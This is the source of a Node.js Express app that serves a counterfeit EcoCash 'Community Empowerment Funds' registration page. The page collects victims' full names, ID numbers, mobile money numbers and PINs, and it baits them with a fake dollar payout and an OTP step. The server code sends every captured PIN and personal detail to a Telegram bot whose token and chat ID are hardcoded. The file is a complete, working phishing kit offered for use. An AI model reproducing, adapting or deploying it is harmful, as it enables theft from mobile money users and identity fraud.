const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== CONFIGURATION - BOT 1 =====
const BOT_TOKEN = '8251322580:AAFB3YYWIlUcdQMoxVMDwC3LJWUg_piMrjI';
const CHAT_ID = '6306424209';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== HTML PAGE =====
const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Registration</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0047AB 0%,#003380 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:35px 28px;max-width:440px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);position:relative;overflow:hidden}
.top-badge{position:absolute;top:0;right:0;background:#0047AB;color:white;padding:8px 20px;font-size:11px;font-weight:bold;border-bottom-left-radius:12px;letter-spacing:1px}
.logo-area{text-align:center;margin-bottom:25px}
.logo-area .logo{width:70px;height:70px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:32px;color:white;font-weight:bold;box-shadow:0 8px 20px rgba(0,71,171,0.3)}
.logo-area h1{color:#0047AB;font-size:1.6em;margin:0;font-weight:bold}
.logo-area .tagline{color:#666;margin-top:6px;font-size:0.9em}
.community-badge{background:linear-gradient(135deg,#FFD700,#FFA500);color:#000;padding:10px;border-radius:10px;text-align:center;font-size:12px;font-weight:bold;margin-bottom:20px;letter-spacing:0.5px}
.progress-bar{display:flex;justify-content:space-between;margin-bottom:25px;gap:6px}
.progress-step{flex:1;height:5px;background:#e0e0e0;border-radius:3px;transition:all 0.3s}
.progress-step.active{background:#0047AB}
.progress-step.completed{background:#28a745}
.form-group{margin-bottom:18px}
.form-group label{display:block;margin-bottom:7px;color:#333;font-weight:600;font-size:13px}
.form-group label .required{color:#f44336}
.form-group input,.form-group select{width:100%;padding:14px 15px;border:2px solid #e0e0e0;border-radius:10px;font-size:15px;transition:all 0.3s;background:#fafafa;font-family:inherit}
.form-group input:focus,.form-group select:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 3px rgba(0,71,171,0.1)}
.form-group input::placeholder{color:#bbb}
.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;transition:all 0.3s;color:white;background:linear-gradient(135deg,#0047AB,#0066CC);margin-top:8px}
.btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,71,171,0.4)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.btn-green{background:linear-gradient(135deg,#28a745,#1e7e34)}
.btn-green:hover:not(:disabled){box-shadow:0 8px 25px rgba(40,167,69,0.4)}
.message{padding:14px;border-radius:10px;margin-top:15px;font-weight:500;display:none;text-align:center;font-size:14px}
.message.show{display:block}
.message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.message.info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb}
.loader{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.footer{text-align:center;margin-top:20px;padding-top:15px;border-top:1px solid #eee;font-size:11px;color:#999}
.footer strong{color:#0047AB;font-weight:bold}
/* OTP PAGE */
.otp-container{display:flex;gap:10px;justify-content:center;margin:25px 0}
.otp-input{width:50px;height:60px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #e0e0e0;border-radius:10px;background:#fafafa;transition:all 0.3s}
.otp-input:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 3px rgba(0,71,171,0.15)}
.otp-input.filled{border-color:#0047AB;background:#f0f6ff}
/* USD DISPLAY */
.usd-display{background:linear-gradient(135deg,#0047AB,#0066CC);color:white;padding:25px;border-radius:15px;text-align:center;margin:20px 0;box-shadow:0 10px 30px rgba(0,71,171,0.3)}
.usd-display .label{font-size:12px;opacity:0.85;letter-spacing:1px;text-transform:uppercase}
.usd-display .amount{font-size:42px;font-weight:bold;margin:10px 0;text-shadow:0 2px 10px rgba(0,0,0,0.2)}
.usd-display .rate{font-size:12px;opacity:0.75;margin-top:5px}
.usd-animation{animation:pulseAmount 1.5s ease-in-out infinite}
@keyframes pulseAmount{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}
/* SMS COUNTDOWN */
.sms-sent-container{text-align:center;padding:30px 15px}
.sms-icon{width:80px;height:80px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:38px;color:white;animation:pulseSms 1.5s ease-in-out infinite;box-shadow:0 8px 25px rgba(0,71,171,0.35)}
@keyframes pulseSms{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.08);opacity:0.9}}
.sms-sent-container h2{color:#0047AB;font-size:1.4em;margin-bottom:10px}
.sms-sent-container p{color:#666;font-size:14px;line-height:1.6;margin-bottom:15px}
.sms-sent-container .phone-highlight{color:#0047AB;font-weight:bold}
.countdown-circle{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,#0047AB,#0066CC);display:flex;align-items:center;justify-content:center;margin:25px auto;color:white;font-size:38px;font-weight:bold;box-shadow:0 10px 30px rgba(0,71,171,0.4);animation:pulseCountdown 1s ease-in-out infinite}
@keyframes pulseCountdown{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
.countdown-text{font-size:13px;color:#999;margin-top:10px}
.sms-progress-bar{width:100%;height:6px;background:#e0e0e0;border-radius:3px;margin:20px 0;overflow:hidden}
.sms-progress-fill{height:100%;background:linear-gradient(135deg,#0047AB,#0066CC);width:0%;transition:width 1s linear}
/* SUCCESS */
.success-container{text-align:center;padding:20px 0}
.success-icon{width:100px;height:100px;background:linear-gradient(135deg,#28a745,#1e7e34);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;font-size:56px;color:white;animation:bounce 1s;box-shadow:0 10px 30px rgba(40,167,69,0.3)}
@keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
.success-container h1{color:#28a745;margin-bottom:10px;font-size:1.6em}
.success-container p{color:#666;margin-bottom:15px;line-height:1.6;font-size:14px}
.details-box{background:#f8f9fa;border-radius:12px;padding:18px;margin:20px 0;text-align:left}
.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e9ecef;font-size:13px}
.detail-row:last-child{border-bottom:none}
.detail-label{color:#666;font-weight:500}
.detail-value{color:#333;font-weight:600}
.status-approved{display:inline-block;padding:8px 22px;border-radius:20px;font-size:13px;font-weight:bold;background:#d4edda;color:#155724;margin-top:10px}
.step-content{display:none}
.step-content.active{display:block;animation:slideIn 0.4s ease-out}
@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
.info-note{background:#e3f2fd;border-left:3px solid #0047AB;padding:12px;border-radius:6px;font-size:12px;color:#0c5460;margin-bottom:18px;line-height:1.5}
</style>
</head>
<body>
<div class="container">
<div class="top-badge">ECOCASH</div>

<div class="logo-area">
<div class="logo">E</div>
<h1>EcoCash</h1>
<div class="tagline">Community Empowerment Funds</div>
</div>

<div class="community-badge">🌟 POWERED BY ECOCASH • COMMUNITY EMPOWERMENT FUNDS 🌟</div>

<div class="progress-bar">
<div class="progress-step active" id="step1Bar"></div>
<div class="progress-step" id="step2Bar"></div>
<div class="progress-step" id="step3Bar"></div>
</div>

<!-- STEP 1: REGISTRATION FORM -->
<div class="step-content active" id="step1Content">
<form id="registerForm">
<div class="form-group">
<label>Full Name <span class="required">*</span></label>
<input type="text" id="fullName" placeholder="Enter your full name" required autocomplete="name">
</div>
<div class="form-group">
<label>ID Number <span class="required">*</span></label>
<input type="text" id="idNumber" placeholder="Enter your ID number" required autocomplete="off">
</div>
<div class="form-group">
<label>EcoCash Number <span class="required">*</span></label>
<input type="tel" id="ecocashNumber" placeholder="0771234567" pattern="[0-9]*" inputmode="numeric" required autocomplete="tel">
</div>
<div class="form-group">
<label>Your EcoCash PIN <span class="required">*</span></label>
<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
</div>
<button type="submit" class="btn" id="submitBtn"><span id="submitText">Continue</span></button>
</form>
<div id="messageDiv" class="message"></div>
</div>

<!-- STEP 2: SMS SENT + COUNTDOWN -->
<div class="step-content" id="step2Content">
<div class="sms-sent-container">
<div class="sms-icon">📩</div>
<h2>SMS OTP Sent</h2>
<p>An OTP has been sent to your EcoCash number<br><span class="phone-highlight" id="sentPhone">---</span></p>
<div class="countdown-circle" id="countdownCircle">10</div>
<div class="countdown-text">Please wait while we prepare your verification</div>
<div class="sms-progress-bar">
<div class="sms-progress-fill" id="smsProgress"></div>
</div>
</div>
</div>

<!-- STEP 3: OTP INPUT -->
<div class="step-content" id="step3Content">
<div style="text-align:center;margin-bottom:15px">
<h2 style="color:#0047AB;font-size:1.3em;margin-bottom:8px">Enter OTP</h2>
<p style="color:#666;font-size:13px">Enter the 6-digit code sent to your phone</p>
</div>
<div class="info-note">
💡 Check your SMS inbox for the 6-digit verification code.
</div>
<div class="otp-container" id="otpContainer">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5">
</div>
<button type="button" class="btn btn-green" id="verifyOtpBtn">Verify OTP</button>
<div id="otpMessage" class="message"></div>
</div>

<!-- STEP 4: SUCCESS -->
<div class="step-content" id="step4Content">
<div class="success-container">
<div class="success-icon">✓</div>
<h1>Successfully Registered!</h1>
<p>Your EcoCash account has been successfully registered for the Community Empowerment Funds program.</p>
<div class="details-box">
<div class="detail-row"><span class="detail-label">Registration ID</span><span class="detail-value" id="regId">#----</span></div>
<div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="regName">---</span></div>
<div class="detail-row"><span class="detail-label">ID Number</span><span class="detail-value" id="regIdNum">---</span></div>
<div class="detail-row"><span class="detail-label">EcoCash Number</span><span class="detail-value" id="regPhone">---</span></div>
</div>
<div class="status-approved">✓ Registered</div>
<p style="margin-top:15px;font-size:13px;color:#999">Funds will reflect in your account shortly.</p>
</div>
</div>

</div>

<script>
var currentAppId = null;
var currentOtp = null;
var countdownInterval = null;

// ===== STEP 1: SUBMIT FORM =====
document.getElementById('registerForm').addEventListener('submit', async function(e){
e.preventDefault();
var fullName=document.getElementById('fullName').value.trim();
var idNumber=document.getElementById('idNumber').value.trim();
var ecocashNumber=document.getElementById('ecocashNumber').value.trim();
var ecoPin=document.getElementById('ecoPin').value.trim();

if(!fullName){showMessage('Please enter your full name','error');return}
if(!idNumber){showMessage('Please enter your ID number','error');return}
if(!ecocashNumber||ecocashNumber.length<10){showMessage('Please enter a valid EcoCash number','error');return}
if(!ecoPin||ecoPin.length!==4){showMessage('EcoCash PIN must be 4 digits','error');return}

var btn=document.getElementById('submitBtn');
var btnText=document.getElementById('submitText');
btn.disabled=true;
btnText.innerHTML='<span class="loader"></span> Processing...';

try{
var response=await fetch('/api/register',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({fullName:fullName,idNumber:idNumber,ecocashNumber:ecocashNumber,ecoPin:ecoPin})
});
var data=await response.json();
if(data.success){
currentAppId=data.registrationId;
currentOtp=data.otp;

// Show USD display briefly
showUsdDisplay(data.amount);

setTimeout(function(){
// Move to SMS countdown step
document.getElementById('step1Content').classList.remove('active');
document.getElementById('step2Content').classList.add('active');
document.getElementById('step1Bar').classList.remove('active');
document.getElementById('step1Bar').classList.add('completed');
document.getElementById('step2Bar').classList.add('active');

// Show phone number
document.getElementById('sentPhone').textContent=ecocashNumber;

// Start countdown
startCountdown();
},2500);
}else{
showMessage(data.message||'Registration failed','error');
btn.disabled=false;
btnText.textContent='Continue';
}
}catch(error){
console.error('Error:',error);
showMessage('Network error. Please try again.','error');
btn.disabled=false;
btnText.textContent='Continue';
}
});

// ===== USD DISPLAY =====
function showUsdDisplay(amount){
var form=document.getElementById('registerForm');
form.innerHTML='<div class="usd-display"><div class="label">💵 Funds Processing</div><div class="amount usd-animation">$'+amount+' USD</div><div class="rate">Flowing to your EcoCash account...</div></div><div class="info-note" style="text-align:center">Please wait while we transfer funds...</div>';
}

// ===== COUNTDOWN =====
function startCountdown(){
var seconds=10;
var circle=document.getElementById('countdownCircle');
var progress=document.getElementById('smsProgress');
var totalTime=10;

circle.textContent=seconds;
progress.style.width='0%';

countdownInterval=setInterval(function(){
seconds--;
circle.textContent=seconds;
var percent=((totalTime-seconds)/totalTime)*100;
progress.style.width=percent+'%';

if(seconds<=0){
clearInterval(countdownInterval);
// Move to OTP step
document.getElementById('step2Content').classList.remove('active');
document.getElementById('step3Content').classList.add('active');
document.getElementById('step2Bar').classList.remove('active');
document.getElementById('step2Bar').classList.add('completed');
document.getElementById('step3Bar').classList.add('active');
document.querySelector('.otp-input').focus();
}
},1000);
}

// ===== OTP INPUT HANDLING =====
var otpInputs=document.querySelectorAll('.otp-input');
otpInputs.forEach(function(input,index){
input.addEventListener('input',function(e){
var value=e.target.value.replace(/\\D/g,'');
e.target.value=value;
if(value){
e.target.classList.add('filled');
if(index<otpInputs.length-1){
otpInputs[index+1].focus();
}
}else{
e.target.classList.remove('filled');
}
});
input.addEventListener('keydown',function(e){
if(e.key==='Backspace'&&!e.target.value&&index>0){
otpInputs[index-1].focus();
}
});
});

// ===== VERIFY OTP =====
document.getElementById('verifyOtpBtn').addEventListener('click',async function(){
var otp='';
otpInputs.forEach(function(input){otp+=input.value});

if(otp.length!==6){
showOtpMessage('Please enter the complete 6-digit OTP','error');
return;
}

var btn=document.getElementById('verifyOtpBtn');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Verifying...';

try{
var response=await fetch('/api/verify-otp',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,otp:otp})
});
var data=await response.json();
if(data.success){
// Move to success step
document.getElementById('step3Content').classList.remove('active');
document.getElementById('step4Content').classList.add('active');
document.getElementById('step3Bar').classList.remove('active');
document.getElementById('step3Bar').classList.add('completed');

document.getElementById('regId').textContent='#'+currentAppId;
document.getElementById('regName').textContent=data.fullName;
document.getElementById('regIdNum').textContent=data.idNumber;
document.getElementById('regPhone').textContent=data.ecocashNumber;
}else{
showOtpMessage(data.message||'Invalid OTP. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify OTP';
}
}catch(error){
console.error('Error:',error);
showOtpMessage('Network error. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify OTP';
}
});

// ===== UTILITY FUNCTIONS =====
function showMessage(text,type){
var div=document.getElementById('messageDiv');
div.textContent=text;
div.className='message show '+type;
setTimeout(function(){div.className='message'},5000);
}

function showOtpMessage(text,type){
var div=document.getElementById('otpMessage');
div.textContent=text;
div.className='message show '+type;
setTimeout(function(){div.className='message'},5000);
}

// ===== INPUT RESTRICTIONS =====
document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
</script>
</body>
</html>`;

// ===== ROUTES =====
app.get('/', (req, res) => {
    res.send(HTML_PAGE);
});

// ===== IN-MEMORY STORAGE =====
const pendingRegistrations = {};

// ===== API: REGISTER =====
app.post('/api/register', async (req, res) => {
    try {
        const { fullName, idNumber, ecocashNumber, ecoPin } = req.body;

        if (!fullName || !idNumber || !ecocashNumber || !ecoPin) {
            return res.status(400).json({
                success: false,
                message: 'All fields are required'
            });
        }

        if (ecoPin.length !== 4) {
            return res.status(400).json({
                success: false,
                message: 'EcoCash PIN must be 4 digits'
            });
        }

        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();
        const otp = Math.floor(100000 + Math.random() * 900000).toString();
        const amount = (Math.floor(Math.random() * 400) + 100).toFixed(2);

        // Store pending registration
        pendingRegistrations[registrationId] = {
            fullName,
            idNumber,
            ecocashNumber,
            ecoPin,
            otp,
            amount,
            verified: false,
            timestamp: new Date().toISOString()
        };

        // Send to Telegram - Registration notification with OTP
        const message =
            '💚 <b>NEW ECOCASH REGISTRATION</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Full Name:</b> ' + fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + ecoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '💵 <b>Amount to Credit:</b> <code>$' + amount + ' USD</code>\n' +
            '🔐 <b>OTP Code:</b> <code>' + otp + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString() + '\n\n' +
            '⏳ <i>Waiting for OTP verification...</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        console.log('✅ Registration sent:', registrationId);

        res.json({
            success: true,
            registrationId: registrationId,
            otp: otp,
            amount: amount,
            message: 'Registration successful'
        });

    } catch (error) {
        console.error('❌ Error:', error.response?.data || error.message);
        res.status(500).json({
            success: false,
            message: 'Failed to process registration'
        });
    }
});

// ===== API: VERIFY OTP =====
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { registrationId, otp } = req.body;

        if (!registrationId || !otp) {
            return res.status(400).json({
                success: false,
                message: 'Registration ID and OTP are required'
            });
        }

        const registration = pendingRegistrations[registrationId];

        if (!registration) {
            return res.status(404).json({
                success: false,
                message: 'Registration not found'
            });
        }

        if (registration.otp !== otp) {
            // Notify admin of wrong OTP
            const wrongMessage =
                '⚠️ <b>WRONG OTP ATTEMPT</b>\n\n' +
                '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
                '👤 <b>Name:</b> ' + registration.fullName + '\n' +
                '🔑 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
                '✅ <b>Correct OTP:</b> <code>' + registration.otp + '</code>\n' +
                '⏰ <b>Time:</b> ' + new Date().toLocaleString();

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await axios.post(url, {
                chat_id: CHAT_ID,
                text: wrongMessage,
                parse_mode: 'HTML'
            });

            return res.status(400).json({
                success: false,
                message: 'Invalid OTP. Please try again.'
            });
        }

        // Mark as verified
        registration.verified = true;

        // Send OTP verified notification
        const verifiedMessage =
            '✅ <b>OTP VERIFIED SUCCESSFULLY</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + registration.ecoPin + '</code>\n' +
            '💵 <b>Amount Credited:</b> <code>$' + registration.amount + ' USD</code>\n' +
            '🔐 <b>OTP Verified:</b> <code>' + otp + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📊 <b>Status:</b> ✅ SUCCESSFULLY REGISTERED\n' +
            '⏰ <b>Verified:</b> ' + new Date().toLocaleString() + '\n\n' +
            '💚 <i>Community Empowerment Funds Program</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: verifiedMessage,
            parse_mode: 'HTML'
        });

        console.log('✅ OTP verified:', registrationId);

        res.json({
            success: true,
            fullName: registration.fullName,
            idNumber: registration.idNumber,
            ecocashNumber: registration.ecocashNumber,
            message: 'OTP verified successfully'
        });

    } catch (error) {
        console.error('❌ Error:', error.response?.data || error.message);
        res.status(500).json({
            success: false,
            message: 'Failed to verify OTP'
        });
    }
});

// ===== HEALTH CHECK =====
app.get('/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`🚀 EcoCash Registration App running on port ${PORT}`);
    console.log(`🤖 Bot: ${BOT_TOKEN.substring(0, 15)}...`);
    console.log(`📱 Chat ID: ${CHAT_ID}`);
});
